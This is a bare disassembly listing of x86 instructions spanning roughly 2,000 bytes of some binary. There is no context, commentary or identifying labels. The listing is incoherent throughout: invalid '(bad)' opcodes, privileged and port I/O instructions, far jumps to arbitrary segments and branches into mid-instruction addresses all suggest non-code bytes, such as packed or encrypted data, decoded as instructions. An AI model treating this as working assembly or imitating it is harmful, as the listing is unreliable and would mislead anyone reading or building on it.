  41abc8:	(bad)  
  41abc9:	xor    al,BYTE PTR [eax+edi*2]
  41abcc:	adc    esi,DWORD PTR [ecx-0x5a]
  41abcf:	or     ebp,DWORD PTR [ebp-0x23dab7b4]
  41abd5:	stc    
  41abd6:	fistp  WORD PTR [esi+0x10039e4]
  41abdc:	pop    ss
  41abdd:	mov    ds,WORD PTR ds:[esi+0x2e]
  41abe1:	aam    0x21
  41abe3:	sti    
  41abe4:	jecxz  0x41ab97
  41abe6:	cli    
  41abe7:	mov    esi,0x408ebbca
  41abec:	and    eax,0xfb0c33e6
  41abf1:	fisubr DWORD PTR [edi]
  41abf3:	pop    esp
  41abf4:	sahf   
  41abf5:	jmp    0x41ac44
  41abf7:	pop    edx
  41abf8:	fbstp  TBYTE PTR [edx+0x68]
  41abfb:	jne    0x41ac18
  41abfd:	and    edx,ebx
  41abff:	jl     0x41ac16
  41ac01:	and    ebp,DWORD PTR [eax-0x60b8a341]
  41ac07:	loopne 0x41ac87
  41ac09:	jno    0x41ab8d
  41ac0b:	jbe    0x41abf3
  41ac0d:	shl    esi,1
  41ac0f:	inc    ecx
  41ac10:	(bad)  
  41ac11:	push   esp
  41ac12:	add    DWORD PTR [ebx+0x67e5c5e6],ebp
  41ac18:	repnz stos DWORD PTR es:[edi],eax
  41ac1a:	xchg   edi,eax
  41ac1b:	mov    edx,0x3e0e2eaa
  41ac20:	dec    ebp
  41ac21:	mov    eax,0x4a13f965
  41ac26:	sbb    al,0x83
  41ac28:	shl    BYTE PTR [ebp+0xc],cl
  41ac2b:	and    eax,0xe7692501
  41ac30:	das    
  41ac31:	mov    ch,BYTE PTR ds:0x71633db9
  41ac37:	call   0x587651aa
  41ac3c:	rol    DWORD PTR [esi+eax*1+0x68],1
  41ac40:	hlt    
  41ac41:	arpl   WORD PTR [ebp-0x598ef35b],bx
  41ac47:	inc    eax
  41ac48:	mov    dh,0x8b
  41ac4a:	dec    esp
  41ac4b:	or     BYTE PTR [ecx],bl
  41ac4d:	mov    al,0x3d
  41ac4f:	inc    ebp
  41ac50:	jmp    0x7392526b
  41ac55:	gs hlt 
  41ac57:	lds    esp,FWORD PTR [eax+0x48]
  41ac5a:	mov    ebx,0xd0d2c746
  41ac5f:	and    ebx,DWORD PTR [esp+eax*8-0x7bf13569]
  41ac66:	lock add ebp,edi
  41ac69:	xchg   ecx,edi
  41ac6b:	jle    0x41acc8
  41ac6d:	ror    esp,0x28
  41ac70:	retf   
  41ac71:	cmc    
  41ac72:	mov    ecx,0x79bc0b41
  41ac77:	xchg   edi,eax
  41ac78:	mov    esp,0xe59f69f6
  41ac7d:	daa    
  41ac7e:	xlat   BYTE PTR ds:[ebx]
  41ac7f:	ins    BYTE PTR es:[edi],dx
  41ac80:	sbb    eax,0xaa5f1731
  41ac85:	enter  0x6a3e,0x67
  41ac89:	sub    ecx,DWORD PTR [ebx+0x3d577a78]
  41ac8f:	dec    ecx
  41ac90:	stos   DWORD PTR es:[edi],eax
  41ac91:	sbb    DWORD PTR [edx],0x6e
  41ac94:	jmp    0x7b40d690
  41ac99:	mov    ds:0x68777650,eax
  41ac9e:	xchg   bl,bl
  41aca0:	mov    al,ds:0x971e9d17
  41aca5:	aas    
  41aca6:	hlt    
  41aca7:	mov    ecx,0x3d29078d
  41acac:	fistp  WORD PTR [ebp-0x35]
  41acaf:	cmc    
  41acb0:	dec    edx
  41acb1:	(bad)  
  41acb2:	mov    eax,ds:0xf1c984cc
  41acb7:	inc    edx
  41acb8:	(bad)  
  41acb9:	jb     0x41ac8e
  41acbb:	jno    0x41ac71
  41acbd:	push   ecx
  41acbe:	in     al,dx
  41acbf:	scas   al,BYTE PTR es:[edi]
  41acc0:	jmp    0x1661df80
  41acc5:	mov    dh,0x5f
  41acc7:	data16 clc 
  41acc9:	(bad)  
  41accb:	scas   al,BYTE PTR es:[edi]
  41accc:	int    0xb5
  41acce:	aas    
  41accf:	sub    ebp,DWORD PTR [ecx]
  41acd1:	jnp    0x41ad45
  41acd3:	pop    ebp
  41acd4:	test   ah,dl
  41acd6:	js     0x41ac7d
  41acd8:	jb     0x41ac5d
  41acda:	mov    al,ds:0xc08c2b7b
  41acdf:	mov    eax,0x88d771fa
  41ace4:	sbb    eax,0xd1037804
  41ace9:	pop    es
  41acea:	jge    0x41ac8a
  41acec:	mov    dh,BYTE PTR [edi-0x1d]
  41acef:	pop    eax
  41acf0:	or     ah,bl
  41acf2:	(bad)
  41acf5:	cmp    DWORD PTR [ebx],esi
  41acf7:	outs   dx,BYTE PTR ds:[esi]
  41acf8:	scas   eax,DWORD PTR es:[edi]
  41acf9:	mov    esp,0xb49a1597
  41acfe:	shl    DWORD PTR [ecx+0x45],0x35
  41ad02:	icebp  
  41ad03:	dec    ecx
  41ad04:	cwde   
  41ad05:	rol    DWORD PTR [edx-0x4e],cl
  41ad08:	jmp    0x41ad4b
  41ad0a:	xchg   cl,bl
  41ad0c:	fild   DWORD PTR [edi]
  41ad0e:	cdq    
  41ad0f:	cmp    BYTE PTR [esi],al
  41ad11:	cmp    DWORD PTR ds:0x3ec3635,edx
  41ad17:	pop    DWORD PTR gs:[esi]
  41ad1a:	sub    DWORD PTR [ecx+esi*1],0xfffffffc
  41ad1e:	fadd   QWORD PTR [edx-0x279ac357]
  41ad24:	into   
  41ad25:	cmp    BYTE PTR [edx+0x3be1912a],0x91
  41ad2c:	mov    edx,0x9721757b
  41ad31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad32:	inc    ebp
  41ad33:	pop    ecx
  41ad34:	loopne 0x41ace2
  41ad36:	mov    bh,0x21
  41ad38:	cmp    eax,ebp
  41ad3a:	shl    BYTE PTR [edi+edi*1-0x43],1
  41ad3e:	mov    ch,0x5b
  41ad40:	jecxz  0x41ad2f
  41ad42:	sbb    esp,DWORD PTR [edi-0x31]
  41ad45:	rol    BYTE PTR [ebp+0x3d35b1cd],cl
  41ad4b:	fidiv  DWORD PTR [eax-0x1fed5106]
  41ad51:	dec    eax
  41ad52:	jmp    0x52bf99e5
  41ad57:	in     eax,0xaa
  41ad59:	fisttp WORD PTR [ebx+0x16]
  41ad5c:	adc    eax,0x22128319
  41ad61:	sbb    bl,BYTE PTR [edi]
  41ad63:	repnz mov eax,gs:0x69045fea
  41ad6a:	sub    al,0xa
  41ad6c:	rol    BYTE PTR [ecx+0x4c],0xaf
  41ad70:	rcr    esi,1
  41ad72:	or     DWORD PTR [edx-0x4],0x5c7e274f
  41ad79:	int3   
  41ad7a:	pop    edi
  41ad7b:	xor    ebp,DWORD PTR [eax+0x26]
  41ad7e:	popf   
  41ad7f:	xchg   ecx,eax
  41ad80:	(bad)  
  41ad81:	inc    edx
  41ad82:	xbegin 0xc1acfed1
  41ad88:	jbe    0x41ada7
  41ad8a:	push   ds
  41ad8b:	out    dx,al
  41ad8c:	iret   
  41ad8d:	push   edi
  41ad8e:	add    BYTE PTR [esi+0x41],dl
  41ad91:	jmp    0x114e:0x74dc24dd
  41ad98:	push   0x9f6ca4ec
  41ad9d:	pop    ebx
  41ad9e:	push   0xffffffaf
  41ada0:	adc    BYTE PTR [esi+0xda98728],ch
  41ada6:	jmp    0x7021:0x51689d13
  41adad:	mov    DWORD PTR [edi+0x4c],edi
  41adb0:	add    al,0xc8
  41adb2:	mov    eax,ds:0x90325dbf
  41adb7:	icebp  
  41adb8:	cs mov dh,0x3e
  41adbb:	out    dx,eax
  41adbc:	or     eax,0xc22d471a
  41adc1:	pop    ss
  41adc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adc3:	mov    WORD PTR [ebp+0xad8c87a],?
  41adc9:	and    BYTE PTR [edx+0x2974de10],ch
  41adcf:	mov    edx,fs
  41add1:	lock ficomp WORD PTR [edx]
  41add4:	add    DWORD PTR [ecx+0x6209277],ecx
  41adda:	mov    ds:0x53c86e66,eax
  41addf:	mov    ch,0x66
  41ade1:	repnz in al,dx
  41ade3:	inc    edx
  41ade4:	jle    0x41ad9e
  41ade6:	stos   DWORD PTR es:[edi],eax
  41ade7:	inc    edx
  41ade8:	(bad)  
  41ade9:	pop    edi
  41adea:	jnp    0x41ae35
  41adec:	dec    eax
  41aded:	sbb    BYTE PTR [ebp+0x4247e5bf],dh
  41adf3:	sub    al,dl
  41adf5:	xchg   DWORD PTR [edi],ebp
  41adf7:	outs   dx,BYTE PTR ds:[esi]
  41adf8:	mov    ds:0xf0278930,al
  41adfd:	imul   ebx,DWORD PTR [eax+0x2472bc1b],0x447d58d9
  41ae07:	repz cmp ecx,0xffffff8d
  41ae0b:	in     al,dx
  41ae0c:	inc    edx
  41ae0d:	lods   al,BYTE PTR ds:[esi]
  41ae0e:	cmp    eax,0xb025ddf1
  41ae13:	jge    0x41ae1e
  41ae15:	xchg   esi,eax
  41ae16:	js     0x41ade2
  41ae18:	sbb    al,0x2f
  41ae1a:	call   0x569d7a4b
  41ae1f:	jae    0x41adf2
  41ae21:	leave  
  41ae22:	(bad)  
  41ae23:	or     esi,DWORD PTR [ecx]
  41ae25:	or     BYTE PTR [esi+0x3bfe98b0],bh
  41ae2b:	jmp    0x43dd:0xf08b9c10
  41ae32:	pop    es
  41ae33:	adc    eax,0x67ab4062
  41ae38:	mov    eax,0xda396557
  41ae3d:	mov    ebp,0x1420493a
  41ae42:	push   0xa4381b67
  41ae47:	or     DWORD PTR [esi-0x3e6f0315],esi
  41ae4d:	inc    ecx
  41ae4e:	adc    DWORD PTR [eax+edi*4+0x55f06dd7],edx
  41ae55:	mov    bh,0x1d
  41ae57:	mov    DWORD PTR [ecx],edi
  41ae59:	cld    
  41ae5a:	mov    ecx,0x3ec80bf7
  41ae5f:	mov    ds:0xa512304d,eax
  41ae64:	jecxz  0x41ade6
  41ae66:	rcl    BYTE PTR [eax+0x6c],cl
  41ae69:	mov    ds:0xa38d86c4,al
  41ae6e:	add    eax,0x40b42ac8
  41ae73:	adc    DWORD PTR [edi-0x12],ebx
  41ae76:	pop    ebp
  41ae77:	or     edx,ebp
  41ae79:	ss sub dl,bh
  41ae7c:	addr16 inc eax
  41ae7e:	jns    0x41ae15
  41ae80:	xlat   BYTE PTR ds:[ebx]
  41ae81:	add    DWORD PTR ds:0x2025b5bd,edi
  41ae87:	mov    eax,0xc50019b9
  41ae8c:	pop    eax
  41ae8d:	into   
  41ae8e:	inc    edi
  41ae8f:	mov    DWORD PTR fs:[esp+eax*8+0x54d3c255],ecx
  41ae97:	and    edi,DWORD PTR [edi-0x50697ea4]
  41ae9d:	xlat   BYTE PTR ds:[ebx]
  41ae9e:	aas    
  41ae9f:	daa    
  41aea0:	mov    cl,0xc8
  41aea2:	mov    bl,0x96
  41aea4:	mov    al,ds:0x3d59abbd
  41aea9:	rcr    cl,1
  41aeab:	into   
  41aeac:	mov    eax,ds:0x3b8386b0
  41aeb1:	mov    ch,0xd4
  41aeb3:	test   eax,0xee68405b
  41aeb8:	loop   0x41aecd
  41aeba:	rcr    DWORD PTR [ecx+ebp*4+0x2f],0x95
  41aebf:	and    eax,0x17ebe1a0
  41aec4:	ret    
  41aec5:	or     dh,bh
  41aec7:	dec    esp
  41aec8:	int    0x8f
  41aeca:	repnz sbb edi,DWORD PTR [ebx+0x58]
  41aece:	aad    0xed
  41aed0:	or     al,BYTE PTR [eax]
  41aed2:	in     eax,0xb
  41aed4:	jb     0x41af05
  41aed6:	jl     0x41aea5
  41aed8:	xor    bh,ah
  41aeda:	xor    ch,bh
  41aedc:	loope  0x41aee2
  41aede:	xor    al,0x4a
  41aee0:	popa   
  41aee1:	xor    ch,BYTE PTR [ebx]
  41aee3:	jp     0x41af05
  41aee5:	or     BYTE PTR [ebp-0x2048ac73],al
  41aeeb:	mov    ecx,0xcbd7bf65
  41aef0:	ret    0xa39a
  41aef3:	pop    edx
  41aef4:	scas   eax,DWORD PTR es:[edi]
  41aef5:	int    0x8c
  41aef7:	xchg   esp,eax
  41aef8:	sub    DWORD PTR [ecx+0x43caa09a],ebp
  41aefe:	mov    ds:0xb9f7cb63,eax
  41af03:	(bad)  
  41af04:	adc    ebp,DWORD PTR [edx-0xe]
  41af07:	out    dx,al
  41af08:	(bad)  
  41af09:	in     al,0x76
  41af0b:	inc    eax
  41af0c:	add    BYTE PTR [ecx],cl
  41af0e:	pop    edi
  41af0f:	jbe    0x41aebc
  41af11:	cli    
  41af12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af13:	jb     0x41aebc
  41af15:	add    edx,eax
  41af17:	xor    ah,ch
  41af19:	aas    
  41af1a:	rcl    DWORD PTR [edx+0x41],1
  41af1d:	inc    esp
  41af1e:	repz (bad) 
  41af20:	addr16 repnz mov bh,0xa0
  41af24:	pop    ss
  41af25:	ja     0x41afa4
  41af27:	jle    0x41aec6
  41af29:	les    edi,FWORD PTR [edi+0x0]
  41af2c:	into   
  41af2d:	and    al,0x5e
  41af2f:	ror    bh,cl
  41af31:	and    al,0x48
  41af33:	pop    edi
  41af34:	stos   BYTE PTR es:[edi],al
  41af35:	jbe    0x41af9f
  41af37:	scas   al,BYTE PTR es:[edi]
  41af38:	stos   DWORD PTR es:[edi],eax
  41af39:	xchg   edx,eax
  41af3a:	or     esi,edi
  41af3c:	jmp    0x9d6a:0x36053d64
  41af43:	push   ss
  41af44:	pop    ebp
  41af45:	cmp    dh,BYTE PTR [edx+0xf150790]
  41af4b:	push   cs
  41af4c:	(bad)  
  41af4e:	push   eax
  41af4f:	xchg   ebx,eax
  41af50:	sti    
  41af51:	inc    ebx
  41af52:	into   
  41af53:	hlt    
  41af54:	daa    
  41af55:	push   0xffffffda
  41af57:	imul   eax,DWORD PTR [esi+0x26],0x68
  41af5b:	xchg   edi,eax
  41af5c:	push   es
  41af5d:	xchg   esp,eax
  41af5e:	repz and esi,esp
  41af61:	sbb    al,0x35
  41af63:	cmp    DWORD PTR [edi+0x29a4527a],ecx
  41af69:	jnp    0x41aef7
  41af6b:	push   ds
  41af6c:	and    al,0x96
  41af6e:	retf   0x985
  41af71:	cli    
  41af72:	sub    bl,BYTE PTR [esi]
  41af74:	push   ebx
  41af75:	push   0x3d
  41af77:	inc    eax
  41af78:	cmc    
  41af79:	dec    edi
  41af7a:	add    DWORD PTR [esi-0x54],0xf4d0b817
  41af81:	jmp    0xe50b:0x25267c6f
  41af88:	and    ah,BYTE PTR [ecx-0x24]
  41af8b:	inc    ebx
  41af8c:	call   0x12945ca6
  41af91:	jmp    0x41af9d
  41af93:	xchg   ebp,eax
  41af94:	pextrw esp,(bad),0xc5
  41af96:	fs aas 
  41af98:	xchg   DWORD PTR [edx-0x66],edx
  41af9b:	loopne 0x41af86
  41af9d:	dec    ecx
  41af9e:	loop   0x41afbc
  41afa0:	or     BYTE PTR [ebx-0x22af4466],bh
  41afa6:	xchg   ecx,eax
  41afa7:	dec    ebp
  41afa8:	inc    edx
  41afa9:	push   ecx
  41afaa:	pop    esp
  41afab:	pop    edx
  41afac:	jns    0x41b004
  41afae:	adc    BYTE PTR [edx+0x62],cl
  41afb1:	inc    edx
  41afb2:	js     0x41b022
  41afb4:	call   0x76b81e5d
  41afb9:	xor    BYTE PTR [ecx+0x3af2217c],0x4e
  41afc0:	mov    ecx,0x62dde984
  41afc5:	jbe    0x41b030
  41afc7:	mov    ebx,0xf9795702
  41afcc:	dec    edx
  41afcd:	mov    ch,bl
  41afcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afd0:	out    dx,al
  41afd1:	repnz inc ebx
  41afd3:	jo     0x41afd5
  41afd5:	cmp    BYTE PTR [esi+0x2127b3c8],0x1d
  41afdc:	les    eax,FWORD PTR [esp+esi*8+0x24]
  41afe0:	imul   eax,DWORD PTR [ecx+0x77784c47],0xffffffdb
  41afe7:	outs   dx,DWORD PTR ds:[esi]
  41afe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afe9:	or     bl,BYTE PTR [ecx+0x55]
  41afec:	mov    al,0x83
  41afee:	out    dx,al
  41afef:	dec    esi
  41aff0:	inc    ebx
  41aff1:	ins    BYTE PTR es:[edi],dx
  41aff2:	stos   DWORD PTR es:[edi],eax
  41aff3:	outs   dx,BYTE PTR ds:[esi]
  41aff4:	add    ebp,ecx
  41aff6:	or     cl,BYTE PTR [ecx]
  41aff8:	xor    DWORD PTR [esi+esi*2+0x67],edi
  41affc:	inc    esi
  41affd:	adc    ebp,DWORD PTR [ecx]
  41afff:	mov    WORD PTR [eax+0x6a6b994b],cs
  41b005:	inc    ebp
  41b006:	jge    0x41afbe
  41b008:	or     ah,BYTE PTR [edx-0x72]
  41b00b:	xor    bh,BYTE PTR [edi-0x30]
  41b00e:	mov    al,BYTE PTR [eax+esi*1-0x1d]
  41b012:	test   DWORD PTR [esi-0x48],ebx
  41b015:	inc    esp
  41b016:	mov    ds,WORD PTR [eax+ebp*1+0x45]
  41b01a:	mov    bl,0x2d
  41b01c:	cmp    DWORD PTR [eax+0xac3406c],esi
  41b022:	xlat   BYTE PTR ds:[ebx]
  41b023:	vunpcklps xmm3,xmm7,XMMWORD PTR [eax+0x13]
  41b028:	sub    al,0x4a
  41b02a:	(bad)  
  41b02b:	gs icebp 
  41b02d:	mov    edi,esp
  41b02f:	cmp    BYTE PTR [ebx],bh
  41b031:	repnz enter 0xdeed,0x29
  41b036:	adc    ch,bh
  41b038:	cdq    
  41b039:	mov    bl,BYTE PTR ds:0x844efd2d
  41b03f:	inc    ecx
  41b040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b041:	shr    BYTE PTR [ecx+0x1a29f573],0x25
  41b048:	iret   
  41b049:	sub    eax,0x3375ab8a
  41b04e:	xor    eax,0x5275ed81
  41b053:	mov    ebp,0x67633c0f
  41b058:	pop    edx
  41b059:	push   eax
  41b05a:	inc    ebx
  41b05b:	mov    edx,0xe0598a70
  41b060:	inc    ebx
  41b061:	sub    esi,ecx
  41b063:	je     0x41b0bf
  41b065:	or     DWORD PTR [esi-0x5877a4ef],eax
  41b06b:	xchg   esp,eax
  41b06c:	sbb    al,0x31
  41b06e:	lahf   
  41b06f:	cmp    edi,eax
  41b071:	stos   BYTE PTR es:[edi],al
  41b072:	cs adc ax,0x3923
  41b077:	popf   
  41b078:	rsm    
  41b07a:	and    ah,ch
  41b07c:	or     BYTE PTR [edi],0x31
  41b07f:	fldcw  WORD PTR [edx+ebp*1]
  41b082:	out    0x5d,al
  41b084:	call   0x47074ec1
  41b089:	jae    0x41b048
  41b08b:	cld    
  41b08c:	and    cl,ah
  41b08e:	or     eax,0xe82cf888
  41b093:	lds    ebp,FWORD PTR [edi+0x25]
  41b096:	imul   ebx,DWORD PTR [ebp-0x52],0xffffffa4
  41b09a:	pop    ebx
  41b09b:	out    dx,eax
  41b09c:	mov    ecx,0x4d8fa285
  41b0a1:	into   
  41b0a2:	xchg   ebp,eax
  41b0a3:	dec    ebp
  41b0a4:	jge    0x41b0ab
  41b0a6:	pop    edx
  41b0a7:	xor    esp,DWORD PTR [ebx]
  41b0a9:	lds    esp,FWORD PTR ds:0xf2987b89
  41b0af:	pop    edx
  41b0b0:	(bad)  
  41b0b1:	or     BYTE PTR [edi-0x3dea4cf8],dh
  41b0b7:	or     ebp,0xa8ca169a
  41b0bd:	aaa    
  41b0be:	(bad)  
  41b0bf:	lock xor ah,BYTE PTR [esi-0x15f14fe8]
  41b0c6:	xor    bh,BYTE PTR [eax+0x4d5619a4]
  41b0cc:	inc    ecx
  41b0cd:	dec    edx
  41b0ce:	sub    ch,al
  41b0d0:	xor    BYTE PTR [edx],0x6e
  41b0d3:	push   0xe2740e92
  41b0d8:	(bad)  
  41b0d9:	sub    ebx,DWORD PTR [ebx-0x6c]
  41b0dc:	jg     0x41b0cf
  41b0de:	retf   0x269f
  41b0e1:	mov    DWORD PTR [edx],esp
  41b0e3:	mov    dh,0xe8
  41b0e5:	hlt    
  41b0e6:	ja     0x41b0bf
  41b0e8:	mov    eax,DWORD PTR [eax]
  41b0ea:	jmp    0xa27e:0x2fd5bf78
  41b0f1:	fcom   QWORD PTR [eax-0x25]
  41b0f4:	sub    ah,BYTE PTR [edx-0x9d484dd]
  41b0fa:	mov    al,ds:0x41e2adaf
  41b0ff:	mov    ecx,0xbd7f657f
  41b104:	in     eax,0xf0
  41b106:	inc    ecx
  41b107:	std    
  41b108:	jns    0x41b0e5
  41b10a:	pop    edx
  41b10b:	xor    esp,DWORD PTR [esi+esi*2-0x64352390]
  41b112:	and    eax,0xafa60568
  41b117:	outs   dx,BYTE PTR ds:[esi]
  41b118:	jmp    0x41b107
  41b11a:	sahf   
  41b11b:	setbe  BYTE PTR ss:[ecx]
  41b11f:	inc    ecx
  41b120:	fst    QWORD PTR [ebx]
  41b122:	ds je  0x41b19e
  41b125:	rcr    BYTE PTR [ecx],1
  41b127:	mov    esi,edx
  41b129:	xchg   ebp,eax
  41b12a:	dec    ebp
  41b12b:	xor    edx,ebp
  41b12d:	cli    
  41b12e:	mov    ch,0xb7
  41b130:	mov    al,ds:0x35e2ee51
  41b135:	stos   BYTE PTR es:[edi],al
  41b136:	pop    es
  41b137:	or     DWORD PTR [ecx],edi
  41b139:	sub    eax,0x42afe039
  41b13e:	rol    BYTE PTR [ebp-0x50],cl
  41b141:	push   es
  41b142:	ins    BYTE PTR es:[edi],dx
  41b143:	jb     0x41b184
  41b145:	rep lods eax,DWORD PTR ds:[esi]
  41b147:	jl     0x41b155
  41b149:	adc    DWORD PTR [eax],ecx
  41b14b:	popf   
  41b14c:	in     al,0x94
  41b14e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b14f:	(bad)  
  41b150:	out    0x8,al
  41b152:	scas   al,BYTE PTR es:[edi]
  41b153:	or     dh,dh
  41b155:	rcl    BYTE PTR [ecx+0x3e],1
  41b158:	dec    ebp
  41b159:	das    
  41b15a:	or     al,0x84
  41b15c:	cmp    al,0x67
  41b15e:	pop    edi
  41b15f:	sti    
  41b160:	nop
  41b161:	pop    ds
  41b162:	add    eax,0xccce14ee
  41b167:	test   al,0x15
  41b169:	xchg   ebp,eax
  41b16a:	or     bl,0x2f
  41b16d:	test   BYTE PTR [edx+ebp*2],ch
  41b170:	xlat   BYTE PTR ds:[ebx]
  41b171:	stos   DWORD PTR es:[edi],eax
  41b172:	cs popa 
  41b174:	sub    ah,BYTE PTR ds:0xe7133bd9
  41b17a:	sar    BYTE PTR [edx],cl
  41b17c:	idiv   bl
  41b17e:	mov    DWORD PTR [ebp+0x4aa0283d],edx
  41b184:	jne    0x41b1da
  41b186:	scas   eax,DWORD PTR es:[edi]
  41b187:	pop    ebp
  41b188:	xchg   edx,eax
  41b189:	fild   WORD PTR [esi]
  41b18b:	lock xor ah,BYTE PTR [esp+eiz*8-0x21880a6a]
  41b193:	mov    DWORD PTR [edx],edx
  41b195:	add    esi,DWORD PTR [ecx]
  41b197:	clc    
  41b198:	pop    ss
  41b199:	aaa    
  41b19a:	cwde   
  41b19b:	mov    ds:0x3b1bc8bc,al
  41b1a0:	sbb    DWORD PTR [ebp+0x31],ebx
  41b1a3:	out    dx,eax
  41b1a4:	and    eax,0x82bafb7e
  41b1a9:	and    DWORD PTR [ebp-0x7984c1ca],eax
  41b1af:	sahf   
  41b1b0:	sti    
  41b1b1:	mov    eax,ds:0x1241a4db
  41b1b6:	cmc    
  41b1b7:	or     al,0xf9
  41b1b9:	lea    eax,[eax-0x479309b]
  41b1bf:	dec    ecx
  41b1c0:	jo     0x41b1e1
  41b1c2:	stos   DWORD PTR es:[edi],eax
  41b1c3:	push   0x1a23a52a
  41b1c8:	lahf   
  41b1c9:	jl     0x41b1ef
  41b1cb:	lods   al,BYTE PTR ds:[esi]
  41b1cc:	dec    esi
  41b1cd:	cli    
  41b1ce:	jmp    0x9e55:0x7a540c41
  41b1d5:	ret    
  41b1d6:	push   ebx
  41b1d7:	mov    ch,0xc4
  41b1d9:	adc    cl,BYTE PTR [eax]
  41b1db:	fstp   QWORD PTR [eax+0x72]
  41b1de:	and    BYTE PTR [ebx-0x5e],0x8f
  41b1e2:	xchg   DWORD PTR [ebp+0x6a],esp
  41b1e5:	pop    edi
  41b1e6:	pop    ss
  41b1e7:	frstor [eax+0x78]
  41b1ea:	push   ecx
  41b1eb:	xor    ah,0x30
  41b1ee:	rcl    DWORD PTR [ebx+0x6156e109],0x8
  41b1f5:	aam    0x97
  41b1f7:	mov    BYTE PTR [ecx-0x29cecb53],0x9e
  41b1fe:	in     al,dx
  41b1ff:	mov    cs,edx
  41b201:	lods   eax,DWORD PTR ds:[esi]
  41b202:	xor    eax,0x58a6bbd5
  41b207:	pushf  
  41b208:	mov    ch,0xba
  41b20a:	mov    edi,DWORD PTR [edx]
  41b20c:	mov    WORD PTR [eax-0x69],gs
  41b20f:	repz jecxz 0x41b266
  41b212:	out    dx,eax
  41b213:	sbb    al,dl
  41b215:	loop   0x41b1f5
  41b217:	jl     0x41b1f8
  41b219:	repnz pop esi
  41b21b:	enter  0x924b,0x38
  41b21f:	test   eax,0xb37503fb
  41b224:	rol    cl,cl
  41b226:	mov    ds:0xfddc186d,eax
  41b22b:	and    DWORD PTR [ebx-0x54d2479c],0x5
  41b232:	mov    ecx,0x70eb44bc
  41b237:	jge    0x41b2a4
  41b239:	imul   ecx,DWORD PTR [eax],0xb7a9988a
  41b23f:	cmp    ch,BYTE PTR [esi]
  41b241:	fwait
  41b242:	shl    BYTE PTR [eax+0x655829d0],0x37
  41b249:	inc    eax
  41b24a:	aad    0x87
  41b24c:	and    eax,edx
  41b24e:	cld    
  41b24f:	mov    edx,0xd2c52e54
  41b254:	mov    WORD PTR [edx+edx*4+0x1b],gs
  41b258:	jmp    0x41b1fe
  41b25a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b25b:	sub    bl,BYTE PTR [esi]
  41b25d:	pop    esi
  41b25e:	retf   
  41b25f:	sahf   
  41b260:	shr    DWORD PTR [ecx+0x2c4d9850],0xf4
  41b267:	pop    esp
  41b268:	mov    ecx,0x3210370f
  41b26d:	or     dl,BYTE PTR [edi+0x14]
  41b270:	and    al,0xcd
  41b272:	mov    ecx,0xc0c6b4c3
  41b277:	mov    ebx,0x80c6415b
  41b27c:	add    ebx,DWORD PTR [eax+0xa322e82]
  41b282:	psrlw  mm0,0xdb
  41b286:	les    edi,FWORD PTR [ebp-0x5a065160]
  41b28c:	fadd   st(3),st
  41b28e:	cli    
  41b28f:	sbb    DWORD PTR [edx],ecx
  41b291:	into   
  41b292:	lds    edx,FWORD PTR [eax+0x43]
  41b295:	and    DWORD PTR [esi+ecx*4],0x334550dd
  41b29c:	xor    ah,dh
  41b29e:	xchg   ebx,eax
  41b29f:	cs addr16 push eax
  41b2a2:	xor    eax,edx
  41b2a4:	jle    0x41b27d
  41b2a6:	fwait
  41b2a7:	jmp    0xbf0e:0xa80d104c
  41b2ae:	mov    esi,0x155f753e
  41b2b3:	jp     0x41b264
  41b2b5:	jo     0x41b2c6
  41b2b7:	xchg   esi,eax
  41b2b8:	lahf   
  41b2b9:	xlat   BYTE PTR es:[ebx]
  41b2bb:	je     0x41b311
  41b2bd:	push   cs
  41b2be:	mov    ecx,0xb4a1a214
  41b2c3:	inc    ecx
  41b2c4:	sub    DWORD PTR [esi],ecx
  41b2c6:	mov    eax,0x411b2d74
  41b2cb:	mov    al,ds:0x5951678c
  41b2d0:	xchg   edi,eax
  41b2d1:	mov    eax,DWORD PTR [eax-0x7e]
  41b2d4:	stc    
  41b2d5:	xor    ah,BYTE PTR [ecx+0x53]
  41b2d8:	jb     0x41b304
  41b2da:	stos   DWORD PTR es:[edi],eax
  41b2db:	sbb    esi,DWORD PTR [ebx]
  41b2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2de:	mov    bl,BYTE PTR [edi]
  41b2e0:	out    dx,al
  41b2e1:	push   0x92df1b65
  41b2e6:	mov    ds:0x667b3927,eax
  41b2eb:	inc    esp
  41b2ec:	out    dx,al
  41b2ed:	fist   WORD PTR [ebx]
  41b2ef:	std    
  41b2f0:	or     edx,DWORD PTR [esi]
  41b2f2:	call   DWORD PTR [edi]
  41b2f4:	xchg   BYTE PTR [ecx+0x52b1515],dl
  41b2fa:	mov    bh,0x8
  41b2fc:	in     al,dx
  41b2fd:	pop    esi
  41b2fe:	mov    ch,0x47
  41b300:	cmp    BYTE PTR [esi+0x1ec7aaf9],bl
  41b306:	fcmovnbe st,st(4)
  41b308:	xchg   esi,eax
  41b309:	(bad)  
  41b30a:	repnz dec eax
  41b30c:	daa    
  41b30d:	ret    
  41b30e:	xor    eax,0xd057ec16
  41b313:	ret    0xa973
  41b316:	jo     0x41b315
  41b318:	in     al,dx
  41b319:	ss fwait
  41b31b:	push   ecx
  41b31c:	mul    DWORD PTR [edx-0x7bfb2a74]
  41b322:	cli    
  41b323:	ja     0x41b2ae
  41b325:	adc    al,0xd9
  41b327:	sbb    al,0xce
  41b329:	popf   
  41b32a:	sbb    eax,0xaa9e9303
  41b32f:	in     eax,dx
  41b330:	push   es
  41b331:	jl     0x41b3b2
  41b333:	ja     0x41b2e7
  41b335:	(bad)  
  41b336:	mov    ch,0xc6
  41b338:	js     0x41b2f6
  41b33a:	mov    ?,WORD PTR [edi-0x5e082b03]
  41b340:	cld    
  41b341:	xchg   BYTE PTR [ecx-0x6a4f21b7],cl
  41b347:	xor    eax,0xba238152
  41b34c:	dec    edi
  41b34d:	lods   eax,DWORD PTR ds:[esi]
  41b34e:	xchg   edi,eax
  41b34f:	test   BYTE PTR [eax],ah
  41b351:	and    DWORD PTR [esi-0x16],0xffffffd8
  41b355:	hlt    
  41b356:	dec    ebp
  41b357:	push   eax
  41b358:	adc    bh,BYTE PTR [ebp+0x40d2c228]
